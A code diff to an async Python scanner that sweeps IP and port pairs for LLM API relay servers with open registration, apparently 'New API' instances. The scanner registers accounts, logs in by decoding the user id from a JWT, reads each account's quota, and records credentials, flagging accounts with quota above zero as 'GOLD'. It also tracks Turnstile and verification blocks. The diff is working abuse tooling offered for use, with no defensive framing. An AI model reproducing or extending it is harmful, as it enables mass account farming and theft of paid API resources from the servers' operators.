@@ -65,24 +65,28 @@ async def check(sess, ip, port):
             b = ""
         low = b.lower()
         if '"success":true' in low or '"success": true' in low:
-            # login + quota
+            # login + quota  (JWT: uid dari claim 'sub')
+            q = None; uid = None
             try:
                 async with sess.post(base + "/api/user/login",
                         json={"username": u, "password": pw}, timeout=12) as r:
                     lj = jparse(await r.text()) or {}
-            except Exception:
-                lj = {}
-            dd = (lj.get("data") if isinstance(lj, dict) else {}) or {}
-            uid = dd.get("id") or (dd.get("user") or {}).get("id")
-            hd = {"New-Api-User": str(uid), "New-API-User": str(uid)}
-            q = None
-            try:
+                dd = (lj.get("data") if isinstance(lj, dict) else {}) or {}
+                uid = dd.get("id") or (dd.get("user") or {}).get("id")
+                tok = dd.get("access_token")
+                if not uid and tok:
+                    import base64 as _b
+                    uid = json.loads(_b.urlsafe_b64decode(tok.split(".")[1] + "==")).get("sub")
+                hd = {"New-Api-User": str(uid), "New-API-User": str(uid)}
+                if tok:
+                    hd["Authorization"] = "Bearer " + tok
                 async with sess.get(base + "/api/user/self", headers=hd, timeout=12) as r:
                     sd = jparse(await r.text()) or {}
-                q = (sd.get("data") or {}).get("quota")
+                q = ((sd.get("data") if isinstance(sd, dict) else {}) or {}).get("quota")
             except Exception:
                 pass
-            rec.update({"verdict": "REG_OK", "user": u, "pass": pw, "uid": uid, "quota": q})
+            rec.update({"verdict": "GOLD" if (q or 0) > 0 else "REG_OK",
+                        "user": u, "pass": pw, "uid": uid, "quota": q})
         elif "turnstile" in low or "security verification" in low:
             rec["verdict"] = "TURNSTILE"
         elif "verificat" in low or "验证" in b:
